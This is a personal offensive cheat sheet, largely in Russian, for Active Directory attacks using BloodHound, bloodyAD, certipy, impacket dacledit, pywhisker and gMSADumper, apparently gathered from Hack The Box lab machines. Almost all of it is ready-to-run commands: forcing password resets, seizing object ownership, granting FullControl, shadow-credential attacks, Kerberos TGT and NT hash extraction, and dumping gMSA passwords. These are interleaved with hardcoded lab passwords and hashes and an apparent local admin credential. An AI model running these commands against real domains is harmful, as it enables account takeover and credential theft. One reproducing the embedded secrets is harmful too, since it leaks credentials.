***************************************
# BloodHound/SharpHound

https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html (Установка шарпхаунда)

https://github.com/SkillfactoryCoding/HACKER-OS-BloodHound (оф репозиторий)

 https://github.com/BloodHoundAD/BloodHound/releases

bloodhound-python --dns-tcp -ns 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d 'authority.htb' -c all (Дампим снаружи домена - нужны креды)

bloodhound-python -d htb.local -ns 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'  -c all

certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip  10.129.228.236  -bloodhound

Запуск

cd /usr/bin && sudo ./neo4j console

cd /home/max/BloodHound-linux-x64 && ./BloodHound --no-sandbox

certiblood

cd ~/blood_ly4k/BloodHound-linux-x64/ && ./BloodHound --no-sandbox


# Этот запрос попытается найти случаи, когда компьютер имеет связь «AdminTo» с другим компьютером.

    MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p





-----------Bloodhound CE

    cd ~

    sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose

    sudo chmod +x /usr/local/bin/docker-compose

    docker-compose --version

    https://github.com/frankloginss/BloodHound-CE.git
    
    cd ~/BloodHound/examples/docker-compose

    sudo docker-compose pull && sudo [BLOODHOUND_PORT=8080] docker-compose up



    docker-compose down -v
---------
    pipx install bloodhound-ce

    bloodhound-ce-python -c all -ns 10.10.11.5 [-dc freelancer.htb] -d freelancer.htb --zip -u 'mikasaAckerman' -p 'IL0v3ErenY3ager'

admin

YXkQXyzbnB69RuDjUy_a2s0MpSEIH8SY

Silvercore_21
-------------------------------------------------------------------------------------------------------------------------------------------------
# GenericAll

# смена пароля 
    bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set password adam.silver 'NewP@ssw0rd123!'
    
# получение информации об аккаунте  adam.silver
     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb get object adam.silver --attr userAccountControl
 
     Изменение атрибута userAccountControl

     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set object adam.silver userAccountControl -v 512
     или ldapmodify -x -H ldap://dc.puppy.htb -D "ant.edwards@puppy.htb" -w "Antman2025 -f mod.ldap 
     
     (где mod.ldap
     
     dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
     changetype: modify
     replace: userAccountControl
     userAccountControl: 512
     )

# WriteOwner

     Shadow Credential
     certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC


 Мы можем попытаться сделать райана владельцем ca_svc с помощью этой команды


    bloodyAD --host 10.10.11.51 -d escapetwo.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan

После выполнения этой команды мы видим, что она разрешена. Чтобы получить полный контроль над пользователем ca_svc, мы можем использовать impacket-dacledit следующим образом

    python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
    После предоставления полного доступа для получения хэша пользователя ca_svc нам нужно выполнить атаку с использованием теневых учётных данных. Эта атака добавляет ключ пользователя ryan в msDS-KeyCredentialLink пользователя ca_svc. После этого пользователь ryan становится копией пользователя ca_svc. Для этого мы можем использовать инструмент certipy следующим образом

    еще раз SHADOW Credentials
    certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
   
   # Write Owner

 делаем себя владельцем
 bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" set owner SUPPORT_SERVICES Haze-IT-Backup$

 добавляем все права

 impacket-dacledit -action write -rights FullControl -principal 'Haze-IT-Backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' -dc-ip 10.10.11.61 "haze.htb/Haze-IT-Backup$" -hashes ':84d6a733d85d9e03f46eba25b34517a9'


 добавляем себя в группу
 bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" add groupMember SUPPORT_SERVICES Haze-IT-Backup$

 делаем SHADOW CREDENTIALS
 python ./pywhisker/pywhisker.py -d "haze.htb" -u "Haze-IT-Backup$" -H '84d6a733d85d9e03f46eba25b34517a9' --target edward.martin --action add 

 запрашиваем TGT
 python ./PKINITtools/gettgtpkinit.py -cert-pfx yraSYsjJ.pfx  -pfx-pass jfew7VTdOnphPokoLwAF haze.htb/edward.martin edward.ccache

 Получение нтлм хеша из ключ сессии Kerberos

 python getnthash.py -key b5fbdc5fe339b991ac044d8e82fcabf94e01cc86feeaba0be192391073d0b5e0 haze.htb/edward.martin

# ЧитатьGMSAPassword 

    кто может прочитать пароль закрытой службы (учетной записи)
    python gMSADumper.py -u 'mark.adams' -p 'Ld@p_Autxxxxxxxxxxx' -d haze.htb

    также 
    Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass

    если Марк входит в группу администраторов gMSA
    Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"

    Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword

    получить NTLM закрытой учетки GMSA
    python gMSADumper.py -u 'mark.adams' -p 'password' -d haze.htb -l dc01.haze.htb

# GenericWrite

  добавляем себя в группу DEVELOPERS
  bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.10.11.70 add groupMember 'DEVELOPERS' 'levi.james'

   Иногда GenericWrite не даёт прямое добавление, но позволяет изменить владельца группы (через SetObjectOwner), а затем добавить себя:

   # Шаг 1: Стать владельцем группы
python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_IP> setObjectOwner 'DEVELOPERS' 'levi.james'

# Шаг 2: Теперь добавить себя
python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_IP> addGroupMember 'DEVELOPERS' 'levi.james'
